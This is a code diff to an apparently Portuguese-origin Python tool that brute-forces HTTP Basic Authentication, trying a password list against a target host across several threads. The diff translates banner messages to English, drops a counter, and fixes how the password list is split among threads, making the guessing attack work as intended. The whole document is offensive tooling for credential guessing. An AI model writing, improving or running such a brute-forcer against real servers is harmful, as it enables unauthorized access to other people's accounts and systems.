@@ -67,12 +67,8 @@ def usage():
 def bruteforce(target, passwords, username, threadID):
 	
 	try:
-	
-		i = 0
 		
 		for password in passwords:
-			
-			i = i + 1
 			
 			password = str(password.rstrip())
 			test = requests.get('http://'+target, auth=(username, password))
@@ -153,41 +149,31 @@ try:
 	listLength = len(passwords)
 
 	print ("")
-	print ("==========================[Começando]==========================")
+	print ("==========================[Starting]==========================")
 	print ("")
 		
 	print ()
-	print ("==========================[Dividindo e conquistando]==========================")
+	print ("==========================[divide and conquer]==========================")
 	print ()
-
-	
-
-	#Divide a lista em n listas, onde n = quantidade de threads
-	spliter = int(int(listLength)/int(threadAmount))
-
-	divider = 0
 
 	threads = []
 
+	splited = [passwords[i::threadAmount] for i in range(threadAmount)]
+
 	for i in range(0,threadAmount):
-		
-		arrays = passwords[divider:spliter]
-		
+
+		arrays = splited[i]
+
 		locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=[target, arrays, username, i])
-		
-		divider = divider + spliter
-		
-		spliter = spliter + spliter
-	
+
 	for i in range(0,threadAmount):
 		
 		locals()['thread%d' % i].start()
-		
+
 		threads.append(locals()['thread%d' % i])
 
 
 	for t in threads:
-	    
 	    t.join()
 	 
 	
